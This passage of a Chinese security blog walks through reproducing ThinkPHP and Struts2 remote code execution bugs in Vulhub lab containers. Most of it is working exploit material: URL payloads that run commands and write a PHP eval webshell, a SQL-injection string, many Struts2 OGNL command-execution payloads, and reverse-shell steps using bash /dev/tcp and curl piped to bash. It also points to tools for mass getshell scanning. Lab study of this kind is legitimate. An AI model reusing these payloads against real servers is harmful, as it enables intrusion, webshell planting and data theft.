eval($_POST['a']);?>\n```\n\n\n\n进行URL编码\n\n\n\n![image-20210516104729763](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516104729763.png)\n\n\n\n最后的payload\n\n```\n/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%61%27%5d%29%3b%3f%3e\n```\n\n\n\n执行一下\n\n\n\n![image-20210516104921607](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516104921607.png)\n\n\n\n这样子就是执行成功的\n\n\n\n去底层看一下 这个`shell.php`是被写到哪个目录下了\n\n\n\n\n\n![image-20210516105006426](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516105006426.png)\n\n\n\n\n\n是成功写入的\n\n\n\n蚁剑连接一下\n\n\n\n![image-20210516105219445](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516105219445.png)\n\n\n\n\n\n![image-20210516105231918](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516105231918.png)\n\n\n\n可以看到是成功的\n\n\n\n## Vulhub-Thinkphp复现\n\n### Thinkphp 2.x 任意代码执行漏洞\n\n#### 漏洞复现\n\n\n\n```\ncd vulhub-master/thinkphp/2-rce\nsudo docker-compose up -d \n```\n\n![image-20210516112631321](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516112631321.png)\n\n\n\n访问一下\n\n\n\n![image-20210516112904397](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516112904397.png)\n\n#### 在线沙箱 进行尝试\n\n沙箱地址： http://sandbox.onlinephpfunctions.com/\n\n```\n<?php\n@preg_replace('/test/e','print_r(\"a001\");','just test');\n```\n\n\n\n7.0以下的版本 存在/e 就可以任意代码执行\n\n\n\n![image-20210516113527294](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516113527294.png)\n\n\n\n\n\n![image-20210516113608816](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516113608816.png)\n\n\n\n#### 代码审计-docker底层分析\n\n\n\n![image-20210516113821945](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516113821945.png)\n\n\n\n找寻一下这个函数\n\n\n\n```\nfind . -name '*.php' | xargs grep -n 'preg_replace'\n```\n\n\n\n复制出来 搞到本地\n\n\n\n![image-20210516113959977](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516113959977.png)\n\n\n\n存在`/e`修饰符的脚本\n\n```\n./ThinkPHP/Mode/Lite/Dispatcher.class.php:115: $res = preg_replace('@(\\w+)'.C('URL_PA\nTHINFO_DEPR').'([^,\\/]+)@e', '$pathInfo[\\'\\\\1\\']=\"\\\\2\";', $_SERVER['PATH_INFO']);\n./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:57: $rule = preg_replace('/{\\$(_\\w\n+)\\.(\\w+)\\|(\\w+)}/e',\"\\\\3(\\$\\\\1['\\\\2'])\",$rule);\n./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:58: $rule = preg_replace('/{\\$(_\\w\n+)\\.(\\w+)}/e',\"\\$\\\\1['\\\\2']\",$rule);\n./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:60: $rule = preg_replace('/{(\\w+)\\\n|(\\w+)}/e',\"\\\\2(\\$_GET['\\\\1'])\",$rule);\n./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:61: $rule = preg_replace('/{(\\w+)}\n/e',\"\\$_GET['\\\\1']\",$rule);\n./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:68: $rule = preg_replace('/{|(\\w+)\n}/e',\"\\\\1()\",$rule);\n./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:102: $res = preg_replace('@(\\w+)'.$dep\nr.'([^'.$depr.'\\/]+)@e', '$var[\\'\\\\1\\']=\"\\\\2\";', implode($depr,$paths));\n./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:224: $res = preg_replace('@(\\w\n+)\\/([^,\\/]+)@e', '$var[\\'\\\\1\\']=\"\\\\2\";', implode('/',$paths));\n./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:239: $res = preg_replace('@(\\w+)\\/([^,\\/]+)@e', '$var[\\'\\\\1\\']=\"\\\\2\";', str_replace($matches[0],'',$regx));\n./ThinkPHP/Common/extend.php:215: $str = preg_replace('#color=\"(.*?)\"#', 'style=\"color: \\\n\\1\"', $str);\n./ThinkPHP/Common/functions.php:145: return ucfirst(preg_replace(\"/_([a-zA-Z])/e\", \"strto\nupper('\\\\1')\", $name));\n```\n\n\n\n漏洞的关键就是这里了 代码位置就是在这里了\n\n\n\n![image-20210516114455185](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516114455185.png)\n\n\n\n#### 漏洞验证\n\n```\n/index.php?s=/index/index/name/${@phpinfo()}\n```\n\n```\n/index.php?s=/index/index/name/$%7B@phpinfo()%7D\n```\n\n\n\n![image-20210516114716456](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516114716456.png)\n\n\n\n#### Poc\n\n\n\n```\n/index.php?s=a/b/c/${@print(eval($_POST[1]))}\n```\n\n\n\n进行抓包\n\n\n\n改成POST的包\n\n\n\n![image-20210516115146602](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516115146602.png)\n\n\n\n\n\n```\n1=system('id');\n```\n\n\n\n执行成功\n\n\n\n![image-20210516115253775](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516115253775.png)\n\n\n\n#### 反弹shell\n\n\n\n```\nbash -i >& /dev/tcp/192.168.175.130/8888 0>&1\n```\n\n\n\n![image-20210516211216935](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516211216935.png)\n\n\n\n\n\n![image-20210516211239687](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516211239687.png)\n\n\n\n\n\n\n\nnc开启监听\n\n```\nnc -lvvp 8888\n```\n\n\n\n![image-20210516211322279](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516211322279.png)\n\n\n\n\n\npython开启http服务\n\n```\npython -m SimpleHTTPServer 9999\n```\n\n\n\n![image-20210516211311881](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516211311881.png)\n\n进行执行\n\n```\n1=system(\"curl 192.168.175.130:9999/shell.sh | bash\");\n```\n\n\n\n![image-20210516211508627](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516211508627.png)\n\n\n\nnc拿到shell\n\n\n\n![image-20210516211559258](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516211559258.png)\n\n\n\n蚁剑连接的话\n\n\n\n```\nhttp://192.168.175.209:8080/index.php?s=a/b/c/${@print(eval($_POST[1]))}\n```\n\n\n\n![image-20210516211831135](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516211831135.png)\n\n\n\n\n\n![image-20210516211848214](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516211848214.png)\n\n\n\n### Thinkphp5-5.0.22/5.1.29远程代码执行漏洞\n\n\n\n#### 漏洞复现\n\n```\ncd vulhub-master/thinkphp/5-rce\nsudo docker-compose up -d\n```\n\n\n\n![image-20210516212604870](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516212604870.png)\n\n\n\n成功访问\n\n\n\n![image-20210516212632637](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516212632637.png)\n\n\n\n#### 漏洞验证\n\n```\n/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1%20and%20it%27ll%20execute%20the%20phpinfo\n```\n\n\n\n![image-20210516212649252](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516212649252.png)\n\n\n\n#### 任意代码执行\n\n```\n/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami\n```\n\n\n\n![image-20210516212706895](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516212706895.png)\n\n\n\n![image-20210516212729751](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516212729751.png)\n\n\n\n#### 写入webshell\n\n```\n<?php eval($_POST['a']);?>\nURL编码\n%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%61%27%5d%29%3b%3f%3e\n```\n\n\n\n![image-20210516212512972](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516212512972.png)\n\n\n\n最后的payload-->shell.php\n\n\n\n```\n/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%61%27%5d%29%3b%3f%3e\n```\n\n\n\n写入成功\n\n\n\n![image-20210516212757138](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516212757138.png)\n\n\n\n去docker底层看一下\n\n\n\n\n\n![image-20210516213253882](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516213253882.png)\n\n\n\n\n\n蚁剑连接\n\n\n\n![image-20210516212911974](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516212911974.png)\n\n\n\n### Thinkphp5.0.23远程代码执行漏洞\n\n\n\n#### 影响版本\n\n\n\n```\nThinkphp 5.0.0~ 5.0.23\n```\n\n\n\n#### 漏洞复现\n\n```\ncd vulhub-master/thinkphp/5.0.23-rce\nsudo docker-compose up -d \n```\n\n\n\n![image-20210517092443132](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517092443132.png)\n\n\n\n访问一下靶机\n\n\n\n![image-20210517092510037](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517092510037.png)\n\n\n\n#### 漏洞验证\n\n进行抓包\n\n进行转换\n\n\n\n![image-20210517092901244](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517092901244.png)\n\n\n\n\n\n![image-20210517092957870](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517092957870.png)\n\n\n\n这里给出完整的数据包\n\n\n\n```\nPOST /index.php?s=captcha HTTP/1.1\nHost: 192.168.175.209:8080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nPragma: no-cache\nCache-Control: no-cache\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\n\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\n```\n\n\n\n#### 反弹shell\n\n把反弹shell 写到shell.sh中\n\n\n\n![image-20210517093330723](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517093330723.png)\n\n\n\npython开启http服务\n\n```\npython -m SimpleHTTPServer 9999\n```\n\nnc开启监听\n\n```\nnc -vlp 8888\n```\n\n\n\n进行执行\n\n```\ncurl 192.168.175.130:9999/shell.sh | bash\n```\n\n![image-20210517093509746](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517093509746.png)\n\n\n\n成功反弹shell\n\n\n\n![image-20210517093530918](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517093530918.png)\n\n### Thinkphp敏感信息泄露\n\n#### 漏洞复现\n\n这边在kali上用P牛的靶场\n\n乌班图那边有点问题\n\n\n\nkali安装docker\n\n\n\n```\nsudo apt install docker-compose\n```\n\n\n\n```\nsudo systemctl start docker #启动docker\ncd /vulhub-master/thinkphp/in-sqlinjection\nsudo docker-compose up -d\n```\n\n\n\n![image-20210517102044583](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517102044583.png)\n\n\n\n\n\n![image-20210517102330781](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517102330781.png)\n\n\n\n\n\n\n\n进行访问\n\n\n\n#### 漏洞验证\n\n\n\n```\n/index.php?ids[]=1&ids[]=2\n```\n\n\n\n![image-20210517104950942](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517104950942.png)\n\n#### Poc\n\n\n\n```\n/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1\n```\n\n\n\n![image-20210517105047474](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517105047474.png)\n\n\n\n枚举到数据库的账号和密码\n\n\n\n## Thinkphp自动化武器\n\n\n\n### Thinkphp综合利用工具\n\n\n\n\n\n![image-20210517103651341](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517103651341.png)\n\n\n\n### ThinkPHPBatchPoc群扫\n\n\n\n执行看一下\n\n\n\n\n\n![image-20210517104229137](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517104229137.png)\n\n\n\n\n\n可以去底层看一下\n\n\n\n我们可以手动添加Poc\n\n\n\n![image-20210517104321007](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517104321007.png)\n\n\n\n它可以自动补充http头\n\n\n\n![image-20210517104345163](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517104345163.png)\n\n\n\n执行 \n\n```\n-u 单个URL\n-f 执行文件\n```\n\n\n\n### TPscan\n\n\n\n![image-20210517112239340](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517112239340.png)\n\n\n\n### AttackWebFrameworkTools\n\n\n\n项目地址：[GitHub - Anonymous-ghost/AttackWebFrameworkTools: 本软件首先集成危害性较大前台rce(无需登录,或者登录绕过执行rce)。反序列化(利用链简单)。上传getshell。sql注入等高危漏洞直接就可以拿权限出数据。其次对一些构造复杂exp漏洞进行检测。傻瓜式导入url即可实现批量测试,能一键getshell检测绝不sql注入或者不是只检测。其中thinkphp 集成所有rce Exp Struts2漏洞集成了shack2 和k8 漏洞利用工具所有Exp并对他们的exp进行优化和修复此工具的所集成漏洞全部是基于平时实战中所得到的经验从而写入到工具里。例如:通达oA一键getshell实战测试 struts2一键getshell 等等](https://github.com/Anonymous-ghost/AttackWebFrameworkTools)\n\n\n\n需要先安装4.5的.NET Framework\n\n\n\n![image-20210517110049535](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517110049535.png)\n\n\n\n\n\n然后要新建两个文本文档\n\n\n\n![image-20210517112647614](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517112647614.png)\n\n\n\n### Thinkphp攻击武器\n\n\n\n双击打开就可以了\n\n\n\n![image-20210517113137966](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517113137966.png)\n\n\n\n![image-20210517113117606](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210517113117606.png)","tags":["Thinkphp总结"],"categories":["服务攻防"]},{"title":"Struts2总结","url":"/2021/06/22/Struts2/","content":"\n**Struts2**\n\n<!--more-->\n\n# Struts2\n\n## 简介\n\n## 下载详情\n\n## 漏洞靶场\n\n## 本地搭建\n\n### 搭建Tomcat\n\n这边我就快速过了\n\n安装Java8\n\n\n\n![image-20210512150128086](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512150128086.png)\n\n\n\n\n\n安装Tomcat\n\n\n\n一路默认就行 我改了一下安装目录\n\n\n\n![image-20210512150225410](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512150225410.png)\n\n\n\n### 部署war包  \n\n\n\n路径：\n\n```\nC:\\Tomcat 8.5\\webapps\n```\n\n\n\n![image-20210512150509901](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512150509901.png)\n\n\n\n启动Tomcat之后呢 会自动部署\n\n\n\n![image-20210512150546921](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512150546921.png)\n\n\n\n\n\n### 成功访问\n\n\n\n![image-20210512150636362](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512150636362.png)\n\n## S2-057漏洞复现\n\n\n\n### 进行访问\n\n\n\n![image-20210512150816712](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512150816712.png)\n\n进行抓包\n\n\n\n### 漏洞验证\n\n\n\n```\n/%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ipconfig%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action\n```\n\n\n\n![image-20210512151516954](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512151516954.png)\n\n\n\n解码一下看看是个什么东西\n\n解码网站：http://tool.chinaz.com/tools/urlencode.aspx\n\n\n\n![image-20210512151453913](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512151453913.png)\n\n\n\n看到这里进行了远程代码执行\n\n\n\n那么直接修改就可以 达到命令注入\n\n\n\n![image-20210512151620958](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512151620958.png)\n\n\n\n弹计算机 \n\n\n\n![image-20210512151704371](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512151704371.png)\n\n\n\n![image-20210512151648963](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512151648963.png)\n\n\n\n## Vulhub进行复现Struts2\n\n\n\n![image-20210512152236796](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512152236796.png)\n\n\n\n### S2-001远程代码执行\n\n#### 漏洞启动\n\n```\nsudo docker-compose up -d\n```\n\n\n\n#### 验证是否开启\n\n```\ndocker ps\n```\n\n\n\n#### 漏洞复现\n\n进行访问\n\n\n\n![image-20210512152711921](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512152711921.png)\n\n\n\n#### 验证漏洞是否存在\n\n```\n%{'a001'}-->a001\n```\n\n\n\n![image-20210512152824435](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512152824435.png)\n\n\n\n执行返回\n\n\n\n![image-20210512152844397](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512152844397.png)\n\n\n\n则漏洞存在\n\n\n\n#### Poc\n\n\n\n进行获取Tomcat的路径\n\n```\n%{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"}\n```\n\n\n\n执行之后 看回显\n\n\n\n![image-20210512153035834](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512153035834.png)\n\n\n\n获取网站的真实路径\n\n\n\n```\n%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}\n```\n\n\n\n![image-20210512153149411](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512153149411.png)\n\n进行命令执行\n\n\n\n```\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"pwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n```\n\n\n\n\n\n![image-20210512153847679](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512153847679.png)\n\n\n\n进行抓包 修改 即可执行其他的命令\n\n\n\n![image-20210512154006935](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512154006935.png)\n\n去Url编码一下  修改这里  执行其他命令\n\n\n\n![image-20210512154151750](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512154151750.png)\n\n\n\n\n\n![image-20210512154205273](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512154205273.png)\n\n\n\n\n\n执行反弹shell 即可上线\n\n\n\n```\nbash -i >& /dev/tcp/ip/port 0>&1\n```\n\n\n\n### S2-005远程代码执行\n\n\n\n一样的开启方法\n\n\n\n进行访问一下\n\n\n\n\n\n![image-20210512155059689](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512155059689.png)\n\n\n\n#### Poc\n\n进行抓包 改成POST\n\n\n\n![image-20210512155228519](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512155228519.png)\n\n\n\n\n\n执行Poc\n\n在tmp目录下 创建一个success文件\n\n\n\n```\n(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1\n```\n\n\n\n![image-20210512155532923](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512155532923.png)\n\n\n\n去底层看一下 是否创建成功\n\n\n\n```\nsudo docker ps\nsudo docker exec -ti fed bash\n```\n\n\n\n可以看到是成功创建的\n\n\n\n![image-20210512155939416](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512155939416.png)\n\n\n\n#### 执行命令\n\n上工具K8\n\n\n\n![image-20210512160818357](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512160818357.png)\n\n\n\n\n\n![image-20210512160903139](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512160903139.png)\n\n\n\n\n\n### S2-007\n\n#### 简介\n\n一个User\n\n```\n(...)\npublic class UserAction extends ActionSupport {\n private Integer age;\n private String name;\n private String email;\n(...)\n```\n\n\n\n#### 漏洞验证\n\n```\n'+(1+1)+'\n```\n\n![image-20210512161246715](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512161246715.png)\n\n存在此漏洞\n\n\n\n#### 漏洞复现\n\n一样的启动方法\n\n进行访问一下\n\n\n\n![image-20210512161019957](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512161019957.png)\n\n\n\n进行抓包\n\n\n\n![image-20210512161527329](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512161527329.png)\n\n#### Poc\n\n进行执行命令\n\n\n\n```\n%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%20/%27%29.getInputStream%28%29%29%29+%2B+%27\n```\n\n\n\n![image-20210512161758945](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512161758945.png)\n\n\n\n执行任意代码的EXP\n\n\n\n```\n' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '\n```\n\n\n\n![image-20210512162027037](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512162027037.png)\n\n\n\n或者\n\n```\n%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29+%2B+%27\n```\n\n\n\n![image-20210512162233214](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512162233214.png)\n\n\n\n#### 进行溯源操作\n\n\n\n进入docker底层\n\n\n\n![image-20210512162739818](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512162739818.png)\n\n\n\n### S2-008\n\n还是一样的部署方法\n\n\n\n访问一下\n\n\n\n![image-20210512172424335](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512172424335.png)\n\n#### 漏洞验证\n\n\n\n```\n/devmode.action?debug=command&expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id\n```\n\n![image-20210512172513012](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512172513012.png)\n\n### S2-009(这个漏洞很多工具扫不出来)\n\n\n\n一样的部署方法 有需要清除浏览器的历史记录\n\n\n\n![image-20210512172905132](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512172905132.png)\n\n\n\n#### 漏洞验证\n\n#### POC-1\n\n```\n/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]\n```\n\n\n\n进行抓包 改成POST\n\n\n\n![image-20210512173133555](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512173133555.png)\n\n\n\n![image-20210512173232663](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512173232663.png)\n\n\n\n#### POC-2\n\n\n\n进行访问：\n\n```\n/ajax/example5\n```\n\n\n\n是一个功能界面\n\n\n\n![image-20210512173602631](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512173602631.png)\n\n进行抓包\n\n\n\n```\nz[%28name%29%28%27meh%27%29]&age=12313&name=(#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,#_memberAccess[\"allowStaticMethodAccess\"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.\nBufferedReader(#b),#d=new char[50000],#c.read(#d),#s=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#s.println(#d\n),#s.close())(meh)}\n```\n\n\n\n![image-20210512174116567](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512174116567.png)\n\n\n\n### S2-012\n\n#### 漏洞复现\n\n一样的方法\n\n\n\n进行访问一下\n\n\n\n![image-20210512175248072](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512175248072.png)\n\n#### 漏洞验证\n\n#### Poc-1\n\n```\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"/bin/bash\",\"-c\", \"ls\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n```\n\n进行抓包\n\n\n\n![image-20210512175515270](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512175515270.png)\n\n\n\n\n\n![image-20210512175617999](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512175617999.png)\n\n#### Poc-2\n\n```\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"cat\", \"/etc/passwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n```\n\n\n\n![image-20210512175949643](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512175949643.png)\n\n\n\n![image-20210512175937028](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512175937028.png)\n\n两者是都要进行URL编码\n\n\n\n### S2-013\n\n#### 漏洞复现\n\n还是一样的开启\n\n访问一下\n\n\n\n#### 漏洞验证\n\n进行抓包\n\n```\n/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D\n```\n\n\n\n![image-20210512213623175](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512213623175.png)\n\n\n\n![image-20210512213645640](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512213645640.png)\n\n\n\n### 